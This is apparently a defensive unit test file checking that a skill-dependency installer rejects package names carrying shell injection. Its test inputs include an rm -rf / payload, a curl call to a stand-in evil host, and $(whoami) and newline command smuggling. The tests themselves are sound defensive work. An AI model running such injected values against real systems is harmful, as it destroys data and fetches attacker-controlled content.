/**
 * Unit tests for `installSkillDependency` command-injection safety — asserts
 * malicious package names are rejected before reaching the package manager.
 */

import { describe, expect, it } from "vitest";
import { installSkillDependency } from "./install";

describe("installSkillDependency command safety", () => {
	it("rejects package names that would escape the install command", async () => {
		for (const packageName of [
			"left-pad; rm -rf /",
			"left-pad && curl https://evil.example",
			"left-pad $(whoami)",
			"left-pad\nwhoami",
			"'left-pad'",
			"--global",
		]) {
			const result = await installSkillDependency({
				option: {
					id: `node-${packageName}`,
					kind: "node",
					package: packageName,
				},
				dryRun: true,
			});

			expect(result.success).toBe(false);
			expect(result.command).toBeUndefined();
			expect(result.error).toContain("Cannot build command");
		}
	});

	it("allows scoped and dotted package identifiers in dry-run plans", async () => {
		const result = await installSkillDependency({
			option: {
				id: "node-safe",
				kind: "node",
				package: "@scope/tool.name-1",
			},
			dryRun: true,
		});

		expect(result.success).toBe(true);
		expect(result.command).toMatch(/ install -g @scope\/tool\.name-1$/);
	});

	it("returns manual install instructions without building a shell command", async () => {
		const result = await installSkillDependency({
			option: {
				id: "manual",
				kind: "manual",
				label: "Install from the vendor page",
			},
			dryRun: true,
		});

		expect(result).toMatchObject({
			success: false,
			error: "Manual installation required: Install from the vendor page",
		});
		expect(result.command).toBeUndefined();
	});
});
